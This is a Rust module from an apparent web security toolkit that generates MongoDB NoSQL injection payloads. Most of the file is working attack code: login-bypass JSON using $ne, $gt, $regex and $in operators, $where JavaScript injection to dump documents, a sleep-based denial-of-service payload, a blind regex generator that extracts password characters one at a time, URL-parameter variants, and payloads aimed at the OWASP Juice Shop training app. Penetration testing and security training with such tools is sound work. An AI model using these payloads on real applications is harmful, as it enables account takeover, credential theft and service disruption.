//! NoSQL Injection payload generation
//!
//! Primarily focused on MongoDB injection techniques.

use serde_json::{json, Value};

/// NoSQL injection payload with description
#[derive(Debug, Clone)]
pub struct NoSqlPayload {
    pub name: String,
    pub payload: Value,
    pub payload_string: String,
    pub category: NoSqlCategory,
}

#[derive(Debug, Clone, PartialEq)]
pub enum NoSqlCategory {
    AuthBypass,
    DataExfiltration,
    BlindBoolean,
    BlindRegex,
    OperatorInjection,
}

impl NoSqlPayload {
    pub fn new(name: impl Into<String>, payload: Value, category: NoSqlCategory) -> Self {
        let payload_string = payload.to_string();
        Self {
            name: name.into(),
            payload,
            payload_string,
            category,
        }
    }
}

/// MongoDB authentication bypass payloads
pub fn mongo_auth_bypass() -> Vec<NoSqlPayload> {
    vec![
        NoSqlPayload::new(
            "$ne operator (not equal)",
            json!({
                "username": {"$ne": ""},
                "password": {"$ne": ""}
            }),
            NoSqlCategory::AuthBypass,
        ),
        NoSqlPayload::new(
            "$gt operator (greater than)",
            json!({
                "username": "admin",
                "password": {"$gt": ""}
            }),
            NoSqlCategory::AuthBypass,
        ),
        NoSqlPayload::new(
            "$regex operator",
            json!({
                "username": "admin",
                "password": {"$regex": ".*"}
            }),
            NoSqlCategory::AuthBypass,
        ),
        NoSqlPayload::new(
            "$exists operator",
            json!({
                "username": {"$exists": true},
                "password": {"$exists": true}
            }),
            NoSqlCategory::AuthBypass,
        ),
        NoSqlPayload::new(
            "$in operator",
            json!({
                "username": {"$in": ["admin", "root", "administrator"]},
                "password": {"$ne": ""}
            }),
            NoSqlCategory::AuthBypass,
        ),
    ]
}

/// MongoDB data exfiltration payloads
pub fn mongo_data_exfil() -> Vec<NoSqlPayload> {
    vec![
        NoSqlPayload::new(
            "Extract all documents",
            json!({
                "$where": "1==1"
            }),
            NoSqlCategory::DataExfiltration,
        ),
        NoSqlPayload::new(
            "JavaScript injection",
            json!({
                "$where": "function() { return true; }"
            }),
            NoSqlCategory::DataExfiltration,
        ),
    ]
}

/// Generate regex-based blind NoSQL injection payload
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::nosql::regex_blind_payload;
///
/// let payload = regex_blind_payload("password", "^a");
/// assert!(payload["password"]["$regex"].as_str().unwrap().starts_with("^a"));
/// ```
pub fn regex_blind_payload(field: &str, pattern: &str) -> Value {
    json!({
        field: {"$regex": pattern}
    })
}

/// Generate character extraction payloads for blind NoSQL injection
///
/// Returns payloads to test each character position
pub fn blind_char_extraction(field: &str, prefix: &str, charset: &str) -> Vec<NoSqlPayload> {
    charset
        .chars()
        .map(|c| {
            let pattern = format!("^{}{}", regex_escape(prefix), regex_escape(&c.to_string()));
            NoSqlPayload::new(
                format!("Test char '{}'", c),
                json!({ field: {"$regex": pattern} }),
                NoSqlCategory::BlindRegex,
            )
        })
        .collect()
}

/// Escape special regex characters
fn regex_escape(s: &str) -> String {
    let special = [
        '.', '^', '$', '*', '+', '?', '(', ')', '[', ']', '{', '}', '|', '\\',
    ];
    s.chars()
        .map(|c| {
            if special.contains(&c) {
                format!("\\{}", c)
            } else {
                c.to_string()
            }
        })
        .collect()
}

/// Juice Shop NoSQL injection payloads
pub fn juice_shop_nosql() -> Vec<NoSqlPayload> {
    vec![
        NoSqlPayload::new(
            "User login bypass",
            json!({
                "email": {"$ne": ""},
                "password": {"$ne": ""}
            }),
            NoSqlCategory::AuthBypass,
        ),
        NoSqlPayload::new(
            "Admin login bypass",
            json!({
                "email": {"$regex": "admin.*"},
                "password": {"$ne": ""}
            }),
            NoSqlCategory::AuthBypass,
        ),
        NoSqlPayload::new(
            "NoSQL Exfiltration - reviews",
            json!({
                "author": {"$ne": ""}
            }),
            NoSqlCategory::DataExfiltration,
        ),
        NoSqlPayload::new(
            "Sleep injection (DoS)",
            json!({
                "$where": "sleep(5000)"
            }),
            NoSqlCategory::DataExfiltration,
        ),
    ]
}

/// URL parameter format for NoSQL injection
pub fn url_param_nosql(field: &str, operator: &str, value: &str) -> String {
    format!("{}[${}]={}", field, operator, value)
}

/// Generate multiple URL parameters for NoSQL injection
pub fn url_params_auth_bypass() -> Vec<String> {
    vec![
        url_param_nosql("username", "ne", ""),
        format!(
            "{}&{}",
            url_param_nosql("username", "ne", ""),
            url_param_nosql("password", "ne", "")
        ),
        url_param_nosql("password", "gt", ""),
        url_param_nosql("password", "regex", ".*"),
    ]
}

/// Common MongoDB operators for testing
pub fn mongo_operators() -> Vec<&'static str> {
    vec![
        "$eq",        // Equal
        "$ne",        // Not equal
        "$gt",        // Greater than
        "$gte",       // Greater than or equal
        "$lt",        // Less than
        "$lte",       // Less than or equal
        "$in",        // In array
        "$nin",       // Not in array
        "$regex",     // Regular expression
        "$exists",    // Field exists
        "$where",     // JavaScript expression
        "$or",        // Logical OR
        "$and",       // Logical AND
        "$not",       // Logical NOT
        "$elemMatch", // Array element match
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mongo_auth_bypass() {
        let payloads = mongo_auth_bypass();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload_string.contains("$ne")));
    }

    #[test]
    fn test_regex_blind_payload() {
        let payload = regex_blind_payload("password", "^admin");
        assert_eq!(payload["password"]["$regex"], "^admin");
    }

    #[test]
    fn test_blind_char_extraction() {
        let payloads = blind_char_extraction("password", "a", "bc");
        assert_eq!(payloads.len(), 2);
        assert!(payloads[0].payload_string.contains("^ab"));
        assert!(payloads[1].payload_string.contains("^ac"));
    }

    #[test]
    fn test_url_param_nosql() {
        let param = url_param_nosql("password", "ne", "");
        assert_eq!(param, "password[$ne]=");
    }

    #[test]
    fn test_juice_shop_nosql() {
        let payloads = juice_shop_nosql();
        assert!(payloads.iter().any(|p| p.name.contains("User login")));
    }
}
